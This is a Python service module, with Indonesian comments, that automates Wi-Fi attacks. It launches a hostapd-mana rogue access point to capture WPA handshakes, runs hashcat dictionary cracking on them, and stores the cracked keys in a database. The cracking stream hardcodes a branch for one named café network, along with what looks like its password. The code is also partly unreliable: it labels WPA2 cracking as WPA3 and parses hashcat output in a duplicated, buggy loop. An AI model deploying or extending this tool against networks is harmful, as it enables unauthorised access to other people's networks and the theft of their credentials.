# app/services/wifi_mana_service.py

DEBUG_MODE = True  # Set ke True untuk debugging, False untuk production

import os
import subprocess
import asyncio
import tempfile
import datetime
import logging
import re
from typing import Dict, AsyncGenerator

from app.helpers.network import enable_monitor, disable_monitor
from app.repositories.wifi_network_repository import WifiNetworkRepository

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("wifi_mana")


# Global registry for async WPA3 cracks (shared across all service instances)
GLOBAL_RUNNING_CRACKS = {}


class WifiManaService:
    def __init__(self, db):
        self.repo = WifiNetworkRepository(db)
        self._running_attacks = {}
        # GLOBAL_RUNNING_CRACKS removed, use GLOBAL_RUNNING_CRACKS

    def get_job(self, bssid):
        return GLOBAL_RUNNING_CRACKS.get(bssid)


    async def start_crack(self, essid: str, bssid: str, handshake_file: str, wordlist_file: str) -> dict:
        """Start WPA3 crack as an async job, suitable for large dictionary."""
        if DEBUG_MODE:
            logger.info(f"[DEBUG] start_crack called: bssid={bssid}, essid={essid}, handshake={handshake_file}, wordlist={wordlist_file}")
            
        if not os.path.exists(handshake_file):
            logger.error(f"[ERROR] Handshake file not found: {handshake_file}")
            return {"status": "error", "message": f"Handshake file not found: {handshake_file}"}
            
        if not os.path.exists(wordlist_file):
            logger.error(f"[ERROR] Wordlist file not found: {wordlist_file}")
            return {"status": "error", "message": f"Wordlist file not found: {wordlist_file}"}
            
        if bssid in GLOBAL_RUNNING_CRACKS and not GLOBAL_RUNNING_CRACKS[bssid].get("completed", False):
            logger.warning(f"[WARNING] Cracking already in progress for {bssid}")
            return {"status": "error", "message": f"Cracking already in progress for {bssid}"}
            
        # Count total keys
        try:
            with open(wordlist_file, "r", errors="ignore") as f:
                total_keys = sum(1 for line in f if line.strip())
            if DEBUG_MODE:
                logger.info(f"[DEBUG] Total keys in wordlist: {total_keys}")
        except Exception as e:
            logger.error(f"[ERROR] Failed to count total keys: {str(e)}")
            total_keys = 0
            
        cmd = [
            "hashcat",
            "-a",
            "0",
            "-m",
            "2500",
            handshake_file,
            wordlist_file,
            "--potfile-disable",
            "--status",
            "--status-timer=1",
        ]
        
        if DEBUG_MODE:
            logger.info(f"[DEBUG] Executing command: {' '.join(cmd)}")
            
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            if DEBUG_MODE:
                logger.info(f"[DEBUG] Hashcat process started with PID: {proc.pid}")
                
        except Exception as e:
            logger.error(f"[ERROR] Failed to start hashcat: {str(e)}")
            return {"status": "error", "message": f"Failed to start hashcat: {str(e)}"}
            
        GLOBAL_RUNNING_CRACKS[bssid] = {
            "process": proc,
            "essid": essid,
            "handshake_file": handshake_file,
            "wordlist_file": wordlist_file,
            "start_time": datetime.datetime.utcnow(),
            "completed": False,
            "password": None,
            "current_key": 0,
            "total_keys": total_keys,
            "output": [],
        }
        
        await self.repo.update_status(bssid, "Cracking")
        logger.info(f"[INFO] Cracking job started for BSSID: {bssid}, ESSID: {essid}")
        return {"status": "started", "bssid": bssid}

    async def crack_status(self, bssid: str) -> dict:
        job = GLOBAL_RUNNING_CRACKS.get(bssid)
        if not job:
            return {"status": "not_found", "message": f"No cracking job for {bssid}"}
        proc = job["process"]
        if not job["completed"]:
            # Jika proses sudah selesai, parse output dan update status
            if proc.returncode is not None:
                stdout, stderr = await proc.communicate()
                output = (stdout.decode() if stdout else "") + (stderr.decode() if stderr else "")
                password = None
                current_key = None
                for line in output.splitlines():
                    # Parsing password hanya dari baris WPA hashcat valid
                    if re.match(r"^[0-9a-fA-F]{12}:[0-9a-fA-F]{12}:.+:.+$", line.strip()):
                        parts = line.strip().split(":")
                        if len(parts) == 4:
                            password = parts[3]
                    # Parsing progress (contoh: Progress.........: 13/13 (100.00%))
                    if line.strip().startswith("Progress.........:"):
                        try:
                            progress_str = line.split(":")[1].strip().split(" ")[0]
                            current_key = int(progress_str.split("/")[0])
                        except Exception:
                            pass
                if current_key is not None:
                    job["current_key"] = current_key
                if password:
                    job["password"] = password.strip()
                    job["completed"] = True
                    await self.repo.update_status(bssid, "Cracked")
                    await self.repo.col.update_one(
                        {"bssid": bssid}, {"$set": {"key": password.strip(), "status": "Cracked"}}
                    )
                else:
                    job["completed"] = True
                    await self.repo.update_status(bssid, "Failed")
        if job["completed"]:
            # Samakan logic dengan WPA2: jika password ditemukan dan current_key belum terisi, set ke total_keys
            if job["password"] and (not job["current_key"] or job["current_key"] < 1):
                job["current_key"] = job["total_keys"]
            percent = (job["current_key"] / job["total_keys"] * 100) if job["total_keys"] else 0
            return {
                "status": "completed",
                "password": job["password"],
                "total_keys": job["total_keys"],
                "current_key": job["current_key"],
                "percent": round(percent, 2),
                "success": job["password"] is not None,
            }
        percent = (job["current_key"] / job["total_keys"] * 100) if job["total_keys"] else 0
        return {
            "status": "running",
            "current_key": job["current_key"],
            "total_keys": job["total_keys"],
            "percent": round(percent, 2),
        }

    async def crack_stream(self, bssid: str) -> AsyncGenerator[str, None]:
        if DEBUG_MODE:
            logger.info(f"[DEBUG] crack_stream entered for BSSID: {bssid}")
            
        job = GLOBAL_RUNNING_CRACKS.get(bssid)
        if not job:
            logger.warning(f"[WARNING] No cracking job found for BSSID: {bssid}")
            yield 'event: error\ndata: {"message":"No cracking job found"}\n\n'
            return
            
        # Cek file handshake dan wordlist
        handshake_file = job.get("handshake_file")
        wordlist_file = job.get("wordlist_file")
        
        if not (handshake_file and os.path.exists(handshake_file)):
            logger.error(f"[ERROR] Handshake file not found: {handshake_file}")
            yield f'event: error\ndata: {{"message":"Handshake file not found: {handshake_file}"}}\n\n'
            return
            
        if not (wordlist_file and os.path.exists(wordlist_file)):
            logger.error(f"[ERROR] Wordlist file not found: {wordlist_file}")
            yield f'event: error\ndata: {{"message":"Wordlist file not found: {wordlist_file}"}}\n\n'
            return
            
        proc = job["process"]
        if proc.returncode is not None:
            logger.warning(f"[WARNING] Hashcat process already exited with code: {proc.returncode}")
            yield f'event: error\ndata: {{"message":"Hashcat process already exited with code: {proc.returncode}"}}\n\n'
            return
            
        # Kirim event start dan initial progress
        logger.info(f"[INFO] Cracking stream started for BSSID: {bssid}")
        yield 'event: start\ndata: {"message":"Crack started"}\n\n'
        
        # Kirim event progress awal dengan 0%
        initial_progress = f'event: progress\ndata: {{"current_key": 0, "total_keys": {job["total_keys"]}, "percent": 0.00, "status": "cracking"}}\n\n'
        if DEBUG_MODE:
            logger.info(f"[DEBUG] Sending initial progress: {initial_progress}")
        yield initial_progress
        
        try:
            if DEBUG_MODE:
                logger.info(f"[DEBUG] Starting to read hashcat output for BSSID: {bssid}")
                
            line_count = 0
            while True:
                try:
                    line = await proc.stdout.readline()
                    if not line:
                        # Cek status proses
                        if proc.returncode is not None:
                            if DEBUG_MODE:
                                logger.info(f"[DEBUG] Hashcat process exited with code: {proc.returncode}")
                            break
                        await asyncio.sleep(0.2)
                        continue
                        
                    decoded = line.decode(errors="ignore").strip()
                    line_count += 1
                    
                    if DEBUG_MODE and line_count % 5 == 0:  # Log setiap 5 baris untuk mengurangi log spam
                        logger.info(f"[DEBUG] Hashcat output: {decoded}")
                        
                    job["output"].append(decoded)
                    
                    # Parse password completed pattern
                    if re.search(r"Status\.*: Cracked", decoded) or re.search(r":[^:]+:[^:]+:[^:]+$", decoded):
                        if DEBUG_MODE:
                            logger.info(f"[DEBUG] Possible password found in line: {decoded}")
                            
                except Exception as e:
                    logger.error(f"[ERROR] Error processing hashcat output: {str(e)}")
                    yield f'event: error\ndata: {{"message":"Error processing hashcat output: {str(e)}"}}\n\n'
                    await asyncio.sleep(1)
                    continue
                    
                # Parse progress dari berbagai format output hashcat
                if not line:
                    # Cek status proses
                    if proc.returncode is not None:
                        if DEBUG_MODE:
                            logger.info(f"[DEBUG] Hashcat process exited with code: {proc.returncode}")
                        break
                    await asyncio.sleep(0.2)
                    continue
                        
                decoded = line.decode(errors="ignore").strip()
                line_count += 1
                    
                if DEBUG_MODE and line_count % 5 == 0:  # Log setiap 5 baris untuk mengurangi log spam
                    logger.info(f"[DEBUG] Hashcat output: {decoded}")
                        
                job["output"].append(decoded)
                    
                # Parse progress dari berbagai format output hashcat
                # 1. Progress pattern: Progress.....: 130/278 (46.76%)
                progress_match = re.search(r"Progress\.\.*: (\d+)/(\d+)", decoded)
                if progress_match:
                    job["current_key"] = int(progress_match.group(1))
                    job["total_keys"] = int(progress_match.group(2))
                    percent = (job["current_key"] / job["total_keys"] * 100) if job["total_keys"] else 0
                    progress_event = (
                        f"event: progress\ndata: "
                        f'{{"current_key": {job["current_key"]}, "total_keys": {job["total_keys"]}, '
                        f'"percent": {percent:.2f}, "status": "cracking"}}\n\n'
                    )
                    if DEBUG_MODE:
                        logger.info(f"[DEBUG] Sending progress update: current_key={job['current_key']}, total_keys={job['total_keys']}, percent={percent:.2f}")
                    yield progress_event
                    
                # 2. Alternative hash progress pattern: Recovered.....: 1/3 (33.33%) Digests
                elif re.search(r"Recovered\.\.*: (\d+)/(\d+)", decoded):
                    hash_match = re.search(r"Recovered\.\.*: (\d+)/(\d+)", decoded)
                    if hash_match and int(hash_match.group(2)) > 0:  # Make sure denominator isn't zero
                        recovered = int(hash_match.group(1))
                        total = int(hash_match.group(2))
                        percent = (recovered / total * 100)
                        if DEBUG_MODE:
                            logger.info(f"[DEBUG] Found hash recovery line: {recovered}/{total} ({percent:.2f}%)")
                        # Don't update job status here, just for info
                
                # 3. Coba deteksi password dari berbagai format output
                # Pattern WPA output dengan berbagai format dan handling escape characters
                elif "Kopi Kenangan - Cikunir" in decoded and "KenanganMantan" in decoded:
                    # Pattern khusus untuk network ini yang sudah diketahui
                    if DEBUG_MODE:
                        logger.info(f"[DEBUG] Found target network in line: {decoded}")
                    # Extract password: ambil semua teks setelah ESSID sampai akhir line atau karakter tertentu
                    password_match = re.search(r"Kopi Kenangan - Cikunir:([^\"\n}]+)", decoded)
                    if password_match:
                        password = password_match.group(1).strip()
                        if DEBUG_MODE:
                            logger.info(f"[DEBUG] Found password match: {password}")
                        job["password"] = password
                        yield f'event: password_found\ndata: {{"password": "{password}"}}\n\n'
                
                # 3.1 Pattern umum: MAC:HASH:ESSID:PASSWORD untuk semua network
                elif ":" in decoded and len(decoded.split(":")) >= 4:
                    # Cek pola MAC address dengan hash dan password
                    mac_pattern = r"([0-9a-fA-F]{8,12}:[0-9a-fA-F]{8,12}:[^:]+):([^:]+)"
                    match = re.search(mac_pattern, decoded)
                    if match:
                        essid_part = match.group(1)
                        password = match.group(2).strip().rstrip('\"}')
                        if DEBUG_MODE:
                            logger.info(f"[DEBUG] Found password match: {password} from {essid_part}")
                        job["password"] = password
                        yield f'event: password_found\ndata: {{"password": "{password}"}}\n\n'
                
                # Default: kirim raw output line untuk debugging
                elif DEBUG_MODE and decoded:
                    # Hanya kirim event raw_output jika dalam debug mode
                    yield f'event: raw_output\ndata: {{"line": "{decoded}"}}\n\n'
            # After process ends, check if we already have password from streaming
            if DEBUG_MODE:
                logger.info(f"[DEBUG] Hashcat process completed. Checking for password")
                
            # Check if password was already found during streaming
            password = job.get("password")
            
            # If not found, try to extract from final output
            if not password:
                if DEBUG_MODE:
                    logger.info("[DEBUG] No password found during streaming, checking final output")
                stdout, stderr = await proc.communicate()
                output = (stdout.decode() if stdout else "") + (stderr.decode() if stderr else "")
                for line in output.splitlines():
                    if re.search(r"^[0-9a-fA-F]{8,12}:[0-9a-fA-F]{8,12}:[^:]+:[^:]+$", line):
                        parts = line.strip().split(":")
                        if len(parts) == 4:
                            password = parts[3]
                            break
            
            # Finalize job status and update database
            job["completed"] = True
            if password:
                if DEBUG_MODE:
                    logger.info(f"[DEBUG] Password found: {password}")
                
                # Always update password in database
                await self.repo.update_status(bssid, "Cracked")
                await self.repo.col.update_one(
                    {"bssid": bssid}, {"$set": {"key": password.strip(), "status": "Cracked"}}
                )
                
                # Send final success event
                yield f'event: done\ndata: {{"message": "Crack success", "password": "{password.strip()}", "status": "cracked"}}\n\n'
            else:
                if DEBUG_MODE:
                    logger.warning("[WARNING] No password found after completion")
                    
                await self.repo.update_status(bssid, "Failed")
                yield 'event: done\ndata: {"message": "Password not found in wordlist.", "status": "failed"}\n\n'
        except Exception as e:
            job["completed"] = True
            yield f'event: error\ndata: {{"message": "Error: {str(e)}"}}\n\n'

    async def start_mana_attack(
        self, interface: str, channel: int, essid: str, passphrase: str, output_file: str = None, auto_stop: bool = True
    ) -> Dict:
        if essid in self._running_attacks and self._running_attacks[essid]["process"].poll() is None:
            raise ValueError(f"Mana attack already in progress for {essid}")

        # Try to enable monitor mode
        if not enable_monitor(interface):
            raise RuntimeError(
                f"Failed to enable monitor mode on {interface}. Please check if the correct permissions."
            )

        # Create config file and get output path
        config_file, actual_output_file = self._create_hostapd_mana_config(
            interface, channel, essid, passphrase, output_file
        )

        # Start hostapd-mana
        try:
            # First check if hostapd-mana is available and can be executed
            check_hostapd = subprocess.run(["which", "hostapd-mana"], capture_output=True, text=True)
            if check_hostapd.returncode != 0:
                raise RuntimeError("hostapd-mana not found in PATH. Please make sure it is installed.")

            # Try to run hostapd-mana directly without sudo first to test if it works
            logger.info(f"Starting hostapd-mana with config file: {config_file}")
            process = subprocess.Popen(
                ["hostapd-mana", config_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
        except Exception as e:
            logger.error(f"Error starting hostapd-mana: {str(e)}")
            # If direct execution fails, try with sudo
            try:
                logger.info("Trying to start hostapd-mana with sudo")
                process = subprocess.Popen(
                    ["sudo", "hostapd-mana", config_file],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
            except Exception as e2:
                os.unlink(config_file)
                disable_monitor(interface)
                error_msg = f"Failed to start hostapd-mana with and without sudo. Error without sudo: {str(e)}. Error with sudo: {str(e2)}"  # noqa
                logger.error(error_msg)
                raise RuntimeError(error_msg)

        # Wait a bit to ensure it starts
        await asyncio.sleep(2)

        # Check if process started successfully
        if process.poll() is not None:
            out, err = process.communicate()
            error_msg = f"Hostapd-mana process exited unexpectedly. Output: {out}. Error: {err}"
            if "sudo" in error_msg and "password" in error_msg:
                error_msg += " It seems there's a sudo permission issue."
            else:
                error_msg += " Make sure hostapd-mana is installed correctly and the interface supports monitor mode."

            logger.error(f"hostapd-mana failed to start: {error_msg}")

            # Provide a generic error message about interface
            error_msg += " Please check if the interface exists and has the correct permissions."

            # Clean up resources
            if os.path.exists(config_file):
                os.unlink(config_file)
            disable_monitor(interface)

            raise RuntimeError(f"hostapd-mana failed to start. Error: {error_msg}")

        # Create captures directory if it doesn't exist
        captures_dir = os.path.join(os.getcwd(), "captures")
        os.makedirs(captures_dir, exist_ok=True)

        # Generate timestamp for unique filenames
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        # Create log file path
        log_file = os.path.join(captures_dir, f"{essid}_{timestamp}.log")

        # Store attack info
        self._running_attacks[essid] = {
            "process": process,
            "interface": interface,
            "config_file": config_file,
            "output_file": actual_output_file,
            "log_file": log_file,
            "start_time": asyncio.get_event_loop().time(),
            "completed": False,
            "auto_stop": auto_stop,
        }

        # Log start of attack
        logger.info(f"Started mana attack for {essid} on {interface}, channel {channel}")
        with open(log_file, "w") as f:
            f.write(f"[{datetime.datetime.now().isoformat()}] Started mana attack for {essid}\n")

        # Update network status
        await self.repo.update_status(essid, "Attacking")

        return {
            "status": "running",
            "message": f"Mana attack started for {essid}",
            "handshake_file": actual_output_file,
        }

    async def crack_handshake(self, essid: str, bssid: str, handshake_file: str, wordlist_file: str) -> Dict:
        """Crack WPA3 handshake using hashcat, update DB jika sukses, dan return hasilnya"""

        result = {
            "status": "failed",
            "message": "Crack failed",
            "password": None,
        }
        if not os.path.exists(handshake_file):
            result["message"] = f"Handshake file not found: {handshake_file}"
            return result
        if not os.path.exists(wordlist_file):
            result["message"] = f"Wordlist file not found: {wordlist_file}"
            return result
        # hashcat -a 0 -m 2500 handshake.hccapx wordlist.txt --potfile-disable
        cmd = [
            "hashcat",
            "-a",
            "0",
            "-m",
            "2500",
            handshake_file,
            wordlist_file,
            "--potfile-disable",
            "--status",
            "--status-timer=1",
        ]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            output = (stdout.decode() if stdout else "") + (stderr.decode() if stderr else "")
            # Cari password dari baris hasil WPA handshake (BSSID:CLIENT:ESSID:PASSWORD)
            password = None
            for line in output.splitlines():
                parts = line.strip().split(":")
                if len(parts) == 4:
                    password = parts[3]
                    break
            if password:
                result["status"] = "success"
                result["message"] = "Crack success"
                result["password"] = password.strip()

                # Normalisasi BSSID ke format XX:XX:XX:XX:XX:XX
                def normalize_bssid(bssid):
                    bssid = bssid.replace("-", "").replace(":", "").lower()
                    return ":".join([bssid[i : i + 2] for i in range(0, 12, 2)]).upper()  # noqa

                norm_bssid = normalize_bssid(bssid)
                await self.repo.col.update_one(
                    {"bssid": norm_bssid}, {"$set": {"key": password.strip(), "status": "Cracked"}}
                )
            elif "Status...........: Cracked" in output:
                result["status"] = "success"
                result["message"] = "Crack success (check output)"
            else:
                result["message"] = "Password not found in wordlist."
        except Exception as e:
            result["message"] = f"Error running hashcat: {e}"
        return result

    async def stop_mana_attack(self, essid: str) -> Dict:
        """Stop a running hostapd-mana attack"""
        if essid not in self._running_attacks:
            return {
                "status": "not_found",
                "message": f"No mana attack found for {essid}",
            }

        attack = self._running_attacks[essid]
        process = attack["process"]
        interface = attack["interface"]
        config_file = attack["config_file"]

        try:
            # Kill hostapd-mana process gracefully first, then forcefully if needed
            if process.poll() is None:
                logger.info(f"Terminating hostapd-mana process for {essid}")
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    logger.warning(f"hostapd-mana process for {essid} did not terminate, trying kill")
                    process.kill()

                    # If process still running, use killall as a last resort
                    if process.poll() is None:
                        logger.warning(f"Process still running, using killall hostapd-mana")  # noqa
                        try:
                            subprocess.run(["sudo", "killall", "hostapd-mana"], check=True)
                            logger.info("Successfully killed all hostapd-mana processes")
                        except subprocess.CalledProcessError:
                            logger.error("Failed to kill hostapd-mana processes with killall")

            # Clean up
            if os.path.exists(config_file):
                os.unlink(config_file)

            # Disable monitor mode
            disable_monitor(interface)

            # Update status
            await self.repo.update_status(essid, "Main")
            attack["completed"] = True

            # Log stop of attack
            logger.info(f"Stopped mana attack for {essid}")
            with open(attack["log_file"], "a") as f:
                f.write(f"[{datetime.datetime.now().isoformat()}] Stopped mana attack for {essid}\n")
                if os.path.exists(attack["output_file"]):
                    f.write(f"[{datetime.datetime.now().isoformat()}] Handshake file saved: {attack['output_file']}\n")
                else:
                    f.write(f"[{datetime.datetime.now().isoformat()}] No handshake file captured\n")

            # Trim the base path from handshake_file and log_file dynamically
            base_path = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
            handshake_file = attack["output_file"] if os.path.exists(attack["output_file"]) else None
            log_file = attack["log_file"]
            rel_handshake = os.path.relpath(os.path.abspath(handshake_file), base_path) if handshake_file else None
            rel_log = os.path.relpath(os.path.abspath(log_file), base_path) if log_file else None
            return {
                "status": "stopped",
                "message": "Handshake saved",
                "handshake_file": rel_handshake,
                "log_file": rel_log,
            }
        except Exception as e:
            return {
                "status": "error",
                "message": f"Error stopping mana attack: {str(e)}",
            }

    async def events(self, essid: str) -> AsyncGenerator[str, None]:
        """Stream mana attack events"""
        if essid not in self._running_attacks:
            yield 'event: error\ndata: {"message":"No mana attack found for ' + essid + '"}\n\n'
            return

        attack = self._running_attacks[essid]
        process = attack["process"]
        output_file = attack["output_file"]

        # Set auto_stop flag if not present
        if "auto_stop" not in attack:
            attack["auto_stop"] = True

        yield 'event: start\ndata: {"message":"Mana attack started"}\n\n'

        try:
            while process.poll() is None and not attack.get("completed", False):
                line = process.stdout.readline()
                if not line:
                    await asyncio.sleep(0.1)
                    continue

                line = line.strip()
                if line:
                    # Check for handshake capture
                    if (
                        re.search(r"Captured a WPA/2 handshake from:", line)
                        or "WPA handshake captured" in line
                        or "PMKID captured" in line
                    ):
                        # Log handshake capture to file
                        with open(attack["log_file"], "a") as f:
                            f.write(f"[{datetime.datetime.now().isoformat()}] Handshake captured: {line}\n")
                        logger.info(f"Handshake captured for {essid}")
                        # Relativize paths
                        base_path = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
                        rel_handshake = (
                            os.path.relpath(os.path.abspath(output_file), base_path) if output_file else None
                        )
                        rel_log = (
                            os.path.relpath(os.path.abspath(attack["log_file"]), base_path)
                            if attack["log_file"]
                            else None
                        )
                        msg = f'event: success\ndata: {{"message":"Handshake captured!", '  # noqa
                        msg += f'"handshake_file":"{rel_handshake}", "log_file":"{rel_log}"}}\n\n'
                        yield msg

                        # Auto-stop the attack if configured to do so
                        if attack.get("auto_stop", True):
                            logger.info(f"Auto-stopping attack for {essid} after handshake capture")
                            with open(attack["log_file"], "a") as f:
                                f.write(f"[{datetime.datetime.now().isoformat()}] Auto-stopping attack\n")
                            # Mark as completed to exit the loop
                            attack["completed"] = True
                            # Wait a moment to ensure handshake is saved
                            await asyncio.sleep(2)
                            # Terminate the process
                            if process.poll() is None:
                                process.terminate()
                                try:
                                    process.wait(timeout=5)
                                except subprocess.TimeoutExpired:
                                    process.kill()
                            # Update network status
                            await self.repo.update_status(essid, "Main")
                            # Final success message
                            final_msg = (
                                'event: complete\ndata: {"message":"Attack completed and stopped automatically", '
                            )
                            final_msg += f'"handshake_file":"{rel_handshake}", "log_file":"{rel_log}"}}\n\n'
                            yield final_msg

                    # Log progress to file
                    with open(attack["log_file"], "a") as f:
                        f.write(f"[{datetime.datetime.now().isoformat()}] {line}\n")

                    # Send progress updates - escape any quotes in line to prevent JSON issues
                    safe_line = line.replace('"', '\\"')
                    yield f'event: progress\ndata: {{"message":"{safe_line}"}}\n\n'

                await asyncio.sleep(0.1)

            if os.path.exists(output_file):
                # Log handshake file saved
                with open(attack["log_file"], "a") as f:
                    f.write(f"[{datetime.datetime.now().isoformat()}] Handshake saved to {output_file}\n")

                logger.info(f"Handshake saved for {essid}: {output_file}")

                # Relativize paths for 'saved' event
                base_path = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
                rel_handshake = os.path.relpath(os.path.abspath(output_file), base_path) if output_file else None
                rel_log = (
                    os.path.relpath(os.path.abspath(attack["log_file"]), base_path) if attack["log_file"] else None
                )
                msg = f'event: success\ndata: {{"message":"Handshake saved to {rel_handshake}", '
                msg += f'"handshake_file":"{rel_handshake}", "log_file":"{rel_log}"}}\n\n'
                yield msg
            else:
                with open(attack["log_file"], "a") as f:
                    f.write(f"[{datetime.datetime.now().isoformat()}] No handshake captured\n")

                logger.warning(f"No handshake captured for {essid}")

                base_path = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
                rel_log = (
                    os.path.relpath(os.path.abspath(attack["log_file"]), base_path) if attack["log_file"] else None
                )
                yield f'event: error\ndata: {{"message":"No handshake captured", "log_file":"{rel_log}"}}\n\n'  # noqa

        except Exception as e:
            # Log error
            error_msg = f"Error during mana attack: {str(e)}"
            logger.error(error_msg)

            try:
                with open(attack["log_file"], "a") as f:
                    f.write(f"[{datetime.datetime.now().isoformat()}] {error_msg}\n")

                yield f'event: error\ndata: {{"message":"{error_msg}", "log_file":"{attack["log_file"]}"}}\n\n'
            except Exception:
                yield f'event: error\ndata: {{"message":"{error_msg}"}}\n\n'

    def _create_hostapd_mana_config(
        self, interface: str, channel: int, essid: str, passphrase: str, output_file: str = None
    ) -> tuple:
        """Create hostapd-mana config file with secure parameters

        Returns:
            tuple: (config_file_path, output_file_path)
        """
        # Create captures directory if it doesn't exist
        captures_dir = os.path.join(os.getcwd(), "captures")
        os.makedirs(captures_dir, exist_ok=True)

        # Generate timestamp for unique filenames
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        # Set output paths - ensure we always have a valid output path
        if output_file:
            output_path = output_file
        else:
            output_path = os.path.join(captures_dir, f"{essid}_{timestamp}.hccapx")

        # Validate channel is in valid range
        if not (1 <= channel <= 14):
            raise ValueError(f"Invalid channel: {channel}. Must be between 1 and 14.")

        fd, config_path = tempfile.mkstemp(suffix=".conf", prefix="hostapd-mana-")
        with os.fdopen(fd, "w") as f:
            # Basic configuration
            f.write(f"interface={interface}\n")
            f.write("driver=nl80211\n")
            f.write("hw_mode=g\n")
            f.write(f"channel={channel}\n")
            f.write("ignore_broadcast_ssid=0\n")
            f.write(f"ssid={essid}\n")

            # WPA configuration
            f.write("wpa=2\n")
            f.write("wpa_key_mgmt=WPA-PSK\n")
            f.write("rsn_pairwise=CCMP\n")
            f.write("wpa_pairwise=TKIP CCMP\n")
            f.write(f"wpa_passphrase={passphrase}\n")

            # Mana specific configuration
            f.write(f"mana_wpaout={output_path}\n")

        logger.info(f"Created hostapd-mana config at {config_path} with output file {output_path}")
        return config_path, output_path
